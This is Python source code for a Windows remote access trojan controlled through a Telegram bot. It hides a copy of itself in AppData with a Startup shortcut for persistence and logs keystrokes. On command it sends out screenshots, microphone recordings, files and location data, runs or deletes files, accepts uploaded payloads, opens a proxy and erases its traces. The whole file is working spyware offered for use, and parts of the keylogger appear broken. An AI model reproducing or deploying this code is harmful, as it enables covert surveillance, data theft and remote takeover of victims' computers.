#!/usr/bin/env python
from PIL import ImageGrab 							# /capture_pc
from shutil import copyfile, copyfileobj, rmtree 	# /ls, /pwd, /cd /copy
from sys import argv, path, stdout 					# console output
from json import loads 								# reading json from ipinfo.io
from winshell import startup 						# persistence
from tendo import singleton							# this makes the application exit if there's another instance already running
from win32com.client import Dispatch				# used for WScript.Shell
from time import strftime, sleep					
import time
import threading 									#used for proxy
import proxy
import pyaudio, wave 								# /hear
import telepot, requests 							# telepot => telegram, requests => file download
import os, os.path, platform, ctypes
import pyHook, pythoncom 							# keylogger

me = singleton.SingleInstance() 

# REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
#token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
token = os.environ['RAT_TOKEN'] # you can set your environment variable as well
# ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
known_ids = []
known_ids.append(os.environ['TELEGRAM_CHAT_ID']) # make sure to remove this line if you don't have this environment variable
appdata_roaming_folder = os.environ['APPDATA']	# = 'C:\Users\Username\AppData\Roaming'
# HIDING OPTIONS
# ---------------------------------------------
hide_folder = appdata_roaming_folder + r'\Portal'	# = 'C:\Users\Username\AppData\Roaming\Portal'
compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
# ---------------------------------------------
target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
if not os.path.exists(hide_folder):
	os.makedirs(hide_folder)
	hide_compiled = hide_folder + '\\' + compiled_name
	copyfile(argv[0], hide_compiled)
	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(target_shortcut)
	shortcut.Targetpath = hide_compiled
	shortcut.WorkingDirectory = hide_folder
	shortcut.save()
initi = False
user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
log_file = hide_folder + '\\keylogs.txt'
# functionalities dictionary: command:arguments
functionalities = { '/capture_pc' : '', \
					'/cd':'<target_dir>', \
					'/delete':'<target_file>', \
					'/download':'<target_file>', \
					'/hear':'[time in seconds, default=5s]', \
					'/ip_info':'', \
					'/keylogs':'', \
					'/ls':'[target_folder]', \
					'/msg_box':'<text>', \
					'/pc_info':'', \
					'/play':'<youtube_videoId>', \
					'/proxy':'', \
					'/pwd':'', \
					'/run':'<target_file>', \
					'/self_destruct':'', \
					'/to':'<target_computer>, [other_target_computer]'}
with open(log_file, "a") as writing:
	writing.write("-------------------------------------------------\n")
	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
	
def checkchat_id(chat_id):
	return len(known_ids) == 0 or str(chat_id) in known_ids
	
def pressed_chars(event):
	if event and type(event.Ascii) == int:
		f = open(log_file,"a")
		if len(event.GetKey()) > 1:
			tofile = '<'+event.GetKey()+'>'
		else:
			tofile = event.GetKey()
		if tofile == '<Return>':
			print tofile
		else:
			stdout.write(tofile)
	return True
	
def handle(msg):
	chat_id = msg['chat']['id']
	if checkchat_id(chat_id):
		if 'text' in msg:
			print 'Got message from ' + str(chat_id) + ': ' + msg['text']
			command = msg['text']
			response = ''
			if command == '/capture_pc':
				bot.sendChatAction(chat_id, 'typing')
				screenshot = ImageGrab.grab()
				screenshot.save('screenshot.jpg')
				bot.sendChatAction(chat_id, 'upload_photo')
				bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
				os.remove('screenshot.jpg')
			elif command.startswith('/cd'):
				command = command.replace('/cd ','')
				try:
					os.chdir(command)
					response = os.getcwd() + '>'
				except:
					response = 'No subfolder matching ' + command
			elif command.startswith('/delete'):
				command = command.replace('/delete', '')
				path_file = command.strip()
				try:
					os.remove(path_file)
					response = 'Succesfully removed file'
				except:
					try:
						os.rmdir(path_file)
						response = 'Succesfully removed folder'
					except:
						try:
							shutil.rmtree(path_file)
							response = 'Succesfully removed folder and it\'s files'
						except:
							response = 'File not found'
			elif command.startswith('/download'):
				bot.sendChatAction(chat_id, 'typing')
				path_file = command.replace('/download', '')
				path_file = path_file[1:]
				if path_file == '':
					response = '/download C:/path/to/file.name or /download file.name'
				else:
					bot.sendChatAction(chat_id, 'upload_document')
					try:
						bot.sendDocument(chat_id, open(path_file, 'rb'))
					except:
						try:
							bot.sendDocument(chat_id, open(hide_folder + '\\' + path_file))
							response = 'Found in hide_folder: ' + hide_folder
						except:
							response = 'Could not find ' + path_file
			elif command.startswith('/hear'):
				SECONDS = -1
				try:
					SECONDS = int(command.replace('/hear','').strip())
				except:
					SECONDS = 5
				 
				CHANNELS = 2
				CHUNK = 1024
				FORMAT = pyaudio.paInt16
				RATE = 44100
				 
				audio = pyaudio.PyAudio()
				bot.sendChatAction(chat_id, 'typing')
				stream = audio.open(format=FORMAT, channels=CHANNELS,
								rate=RATE, input=True,
								frames_per_buffer=CHUNK)
				frames = []
				for i in range(0, int(RATE / CHUNK * SECONDS)):
					data = stream.read(CHUNK)
					frames.append(data)
				stream.stop_stream()
				stream.close()
				audio.terminate()
				
				wav_path = hide_folder + '\\mouthlogs.wav'
				waveFile = wave.open(wav_path, 'wb')
				waveFile.setnchannels(CHANNELS)
				waveFile.setsampwidth(audio.get_sample_size(FORMAT))
				waveFile.setframerate(RATE)
				waveFile.writeframes(b''.join(frames))
				waveFile.close()
				bot.sendChatAction(chat_id, 'upload_document')
				bot.sendAudio(chat_id, audio=open(wav_path, 'rb'))
			elif command == '/ip_info':
				bot.sendChatAction(chat_id, 'find_location')
				info = requests.get('http://ipinfo.io').text #json format
				response = info
				location = (loads(info)['loc']).split(',')
				bot.sendLocation(chat_id, location[0], location[1])
			elif command == '/keylogs':
				bot.sendChatAction(chat_id, 'upload_document')
				bot.sendDocument(chat_id, open(log_file, "rb"))
			elif command.startswith('/ls'):
				bot.sendChatAction(chat_id, 'typing')
				command = command.replace('/ls', '')
				command = command.strip()
				files = []
				if len(command) > 0:
					files = os.listdir(command)
				else:
					files = os.listdir(os.getcwd())
				human_readable = ''
				for file in files:
					human_readable += file + '\n'
				response = human_readable
			elif command.startswith('/msg_box'):
				message = command.replace('/msg_box', '')
				if message == '':
					response = '/msg_box yourText'
				else:
					ctypes.windll.user32.MessageBoxW(0, message, u'Information', 0x40)
					response = 'MsgBox displayed'
			elif command == '/pc_info':
				bot.sendChatAction(chat_id, 'typing')
				info = ''
				for pc_info in platform.uname():
					info += '\n' + pc_info
				response = info
			elif command.startswith('/play'):
				command = command.replace('/play ', '')
				command = command.strip()
				if len(command) > 0:
					systemCommand = 'start \"\" \"https://www.youtube.com/embed/'
					systemCommand += command
					systemCommand += '?autoplay=1&showinfo=0&controls=0\"'
					if os.system(systemCommand) == 0:
						response = 'YouTube video is now playing'
					else:
						response = 'Failed playing YouTube video'
				else:
					response = '/play <VIDEOID>\n/play A5ZqNOJbamU'
			elif command == '/proxy':#WIP
				threading.Thread(target=proxy.main).start()
				info = requests.get('http://ipinfo.io').text #json format
				ip = (loads(info)['ip'])
				response = 'Proxy succesfully setup on ' + ip + ':8081'
			elif command == '/pwd':
				response = os.getcwd()
			elif command.startswith('/run'):
				bot.sendChatAction(chat_id, 'typing')
				path_file = command.replace('/run', '')
				path_file = path_file[1:]
				if path_file == '':
					response = '/run_file C:/path/to/file'
				else:
					try:
						os.startfile(path_file)
						response = 'File ' + path_file + ' has been run'
					except:
						try:
							os.startfile(hide_folder + '\\' + path_file)
							response = 'File ' + path_file + ' has been run from hide_folder'
						except:
							response = 'File not found'
					
			elif command == '/self_destruct':
				bot.sendChatAction(chat_id, 'typing')
				global initi
				initi = True
				response = 'You sure? Type \'destroy!\' to proceed.'
			elif command == 'destroy!' and initi == True:
				bot.sendChatAction(chat_id, 'typing')
				response = 'Destroying all traces!'
				if os.path.exists(hide_folder):
					for file in os.listdir(hide_folder):
						try:
							os.remove(hide_folder + '\\' + file)
						except:
							pass
				if os.path.isfile(target_shortcut):
					os.remove(target_shortcut)
				while True:
					sleep(10)
			elif command.startswith('/to'):
				command = command.replace('/to','')
				if command == '':
					response = '/to <COMPUTER_1_NAME>, <COMPUTER_2_NAME> /msg_box Hello HOME-PC and WORK-PC'
				else:
					targets = command[:command.index('/')]
					if platform.uname()[1] in targets:
						command = command.replace(targets, '')
						msg = {'text' : command, 'chat' : { 'id' : chat_id }}
						handle(msg)
			elif command == '/help':
				response = "\n".join(command+': '+description for command,description in functionalities.items())
			else: # redirect to /help
				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
				handle(msg)
			if response != '':
				bot.sendMessage(chat_id, response)
		else: # Upload a file to target
			file_name = ''
			file_id = None
			if 'document' in msg:
				file_name = msg['document']['file_name']
				file_id = msg['document']['file_id']
			elif 'photo' in msg:
				file_time = int(time.time())
				file_id = msg['photo'][1]['file_id']
				file_name = file_id + '.jpg'
			file_path = bot.getFile(file_id=file_id)['file_path']
			link = 'https://api.telegram.org/file/bot' + str(token) + '/' + file_path
			file = (requests.get(link, stream=True)).raw
			with open(hide_folder + '\\' + file_name, 'wb') as out_file:
				copyfileobj(file, out_file)
			response = 'File received succesfully.'
			
bot = telepot.Bot(token)
bot.message_loop(handle)
if len(known_ids) > 0:
	helloWorld = platform.uname()[1] + ": I'm up."
	print helloWorld
	for known_id in known_ids:
		bot.sendMessage(known_id, helloWorld)
print 'Listening for commands on ' + platform.uname()[1] + '...'
proc = pyHook.HookManager()
proc.KeyDown = pressed_chars
proc.HookKeyboard()
pythoncom.PumpMessages()